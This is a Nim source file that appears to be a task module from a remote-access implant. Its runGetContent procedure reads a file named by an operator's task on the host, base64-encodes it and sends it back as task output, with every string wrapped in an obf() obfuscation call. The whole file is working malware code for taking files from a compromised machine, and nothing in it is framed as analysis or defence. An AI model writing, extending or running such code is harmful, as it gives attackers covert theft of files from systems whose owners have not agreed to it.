import std/[base64, json, strutils]
import ../utils/global
import ../utils/tasks/buffer
import ../utils/linapi/handlers
import ../utils/linapi/utils

var fileMaxSize* = 25'u64 * 1024 * 1024

const fileMaxSizeError* = obf("File exceeds the 25 MB limit")

proc baseName(path: string): string =
  # Returns the file name from a path
  let sep = path.rfind('/')
  if sep >= 0: path[sep + 1 .. ^1] else: path

proc queryFileByteSize(path: string): tuple[ok: bool, size: uint64, error: string] =
  # Reads the byte size of a file
  let sz = getPathSize(path)
  if sz < 0:
    return (false, 0, ioErrorMessage(getErrno()))
  (true, sz.uint64, "")

proc runGetContent*(host, taskTag, input, params: string) =
  # Reads a file and sends the encoded content
  let inputPath = input.strip()

  if inputPath.len == 0 or inputPath == pathSep or inputPath == obf(" "):
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): obf("File path is empty"),
    }), params, taskTag)
    return

  let sizeMeta = queryFileByteSize(inputPath)
  if not sizeMeta.ok:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): sizeMeta.error,
    }), params, taskTag)
    return
  if sizeMeta.size > fileMaxSize:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): fileMaxSizeError,
    }), params, taskTag)
    return

  let readResult = readFileBytes(inputPath)
  if not readResult.ok:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): readResult.error,
    }), params, taskTag)
    return

  discard apply_task_output($( %*{
    obf("option"): obf("output"),
    obf("type"): obf("folders"),
    obf("host"): host,
    obf("task_tag"): taskTag,
    obf("get_content"): true,
    obf("file_name"): baseName(inputPath),
    obf("content"): encode(readResult.data),
  }), params, taskTag)

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Entrypoint that runs get content
  discard buf
  runGetContent(host, taskTag, input, params)
  0
